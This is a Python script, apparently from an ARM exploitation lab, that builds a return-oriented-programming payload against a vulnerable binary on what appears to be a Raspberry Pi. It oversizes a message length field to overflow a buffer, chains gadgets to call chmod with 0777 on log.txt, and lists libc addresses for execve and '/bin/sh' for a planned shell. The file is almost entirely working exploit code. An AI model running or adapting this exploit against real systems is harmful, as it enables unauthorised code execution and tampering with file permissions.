import struct
import sys

# Sample of how our program should look like, or how we want it to look like

#00010450 <main>:
#   10450:	e92d4800 	push	{fp, lr}
#   10454:	e28db004 	add	fp, sp, #4

# Calling chmod
#   10458:	e59f0024 	ldr	r0, [pc, #36]	; 10484 <main+0x34>
#   1045c:	e59f1024 	ldr	r1, [pc, #36]	; 10488 <main+0x38>
#   10460:	ebffffaa 	bl	10310 <chmod@plt>
#   10464:	e3a0000b 	mov	r0, #11
#   10468:	e59f1014 	ldr	r1, [pc, #20]	; 10484 <main+0x34>

# Using syscall or
#   1046c:	e3a02000 	mov	r2, #0
#   10470:	e3a03000 	mov	r3, #0
#   10474:	ebffffa2 	bl	10304 <syscall@plt>

# Using execve
#   10468:       e3a01000        mov     r1, #0
#   1046c:       e3a02000        mov     r2, #0
#   10470:       ebffffa3        bl      10304 <execve@plt>

#   10478:	e3a03000 	mov	r3, #0
#   1047c:	e1a00003 	mov	r0, r3
#   10480:	e8bd8800 	pop	{fp, pc}
#   10484:	00010500 	.word	0x00010500
#   10488:	00000309 	.word	0x00000309
#
###########################################################################
# LIST OF USEFUL GADGETS:#######################################

POP_R3 = 0x00010668         # pop {r3, pc}
MOV_R3_R0 = 0x000109c4      # mov r0, r3 ; sub sp, fp, #8 ; pop {r4, fp, pc}
POP_8 =  0x00010a40         # pop {r3, r4, r5, r6, r7, r8, sb, pc}
LDR1_R3_TO_R0 = 0x000109b4  # ldr r0, [fp, #-0x10] ; ldr r1, [fp, #-0x14] ; bl #0x1088c ; mov r3, #0 ; mov r0, r3 ; sub sp, fp, #8 ; pop {r4, fp, pc}
R7_INTO_R0 = 0x00010a28     # mov r0, r7 ; mov r1, r8 ; mov r2, sb ; blx r3
POP_FP = 0x0001086c         # pop {fp, pc}
POP_r4 = 0x00010804         # pop {r4, pc}
MOV_R8_R1 = 0x00010a2c      # mov r1, r8 ; mov r2, sb ; blx r3
POP_LR = 0x00010820         # pop {r3, lr} ; b #0x107c0 ; ldr r3, [pc, #0x10] ; cmp r3, #0 ; beq #0x10834 ; blx r3

DUMMY = "ABAB"
# 1) We need control of r0 and r1 , pc and lr 

# Gadget Staging area
#payload += struct.pack("i", POP_8) # Now 8 is loaded in
#payload += struct.pack("i", 0x76df5160) # branch for R7_INTO_R0 to chmod
#payload += DUMMY # Padding for r4
#payload += DUMMY # Padding for r5
#payload += DUMMY # Padding for r6
#payload += struct.pack("i", 0x10ab8)
#payload += struct.pack("i", 0x309)
#payload += DUMMY # Padding for sb
#payload += struct.pack("i", R7_INTO_R0) # r8 to r1 r7 to r0
# Here chmod has been called, now we do execve, at this point, we execute POP_8 again



################################################################
# LIST OF USEFUL ADDRESSES:
# LIBC: 0x76d33000 - 0x76e70000
# libwiringPi : 0x76f84000 - 0x76fa1000
# chmod: 0x76df5160
# syscall: 0x76e00c20
# execve: 0x76dd2814
# "/bin/sh": 0x76e50b20
# "log.txt": 0x10ab8
################################################################
# Normally message size will follow the payload size, but for an overflow
# we set this to a high value, enough to acommodate our ROP payload
#message_size = struct.pack("i", 0x00000004);
message_size = struct.pack("i", 0x00000442);

padding = "AABBCCDDEEFFGGHH"

# The following jump will access the secret function within the binary itself.
#jump = struct.pack("i", 0x00010668);
payload = struct.pack("i", POP_8);

# Base address of VMA is always going to be 0x76F84000 for libwiringPi.so
# Find gadgets at offset of that. THe following jump goes to base+0xa608
#jump = struct.pack("i", 0x76F8E608);

#payload += struct.pack("i", POP_R3)
#payload += DUMMY # Padding for r4
#payload += DUMMY # Padding for r5
#payload += DUMMY # Padding for r6
#payload += DUMMY # Padding for r7
#payload += struct.pack("i", 0x00000309) # 777
#payload += DUMMY # Padding for sb
#payload += struct.pack("i", MOV_R8_R1) # r8 r1
#payload += "AAAA"

payload += struct.pack("i", 0x76df5160) # branch for R7_INTO_R0 to chmod
payload += DUMMY # Padding for r4
payload += DUMMY # Padding for r5
payload += DUMMY # Padding for r6
payload += struct.pack("i", 0x00010ab8)
payload += struct.pack("i", 0x00000309)
payload += DUMMY # Padding for sb
payload += struct.pack("i", R7_INTO_R0) # r8 to r1 r7 to r0
payload += "KKLLMMNNOOPPQQRRSSTTUUVVWWXXYYZZ"



# print will print with a LF character. Write prints without
sys.stdout.write(message_size + padding + payload)
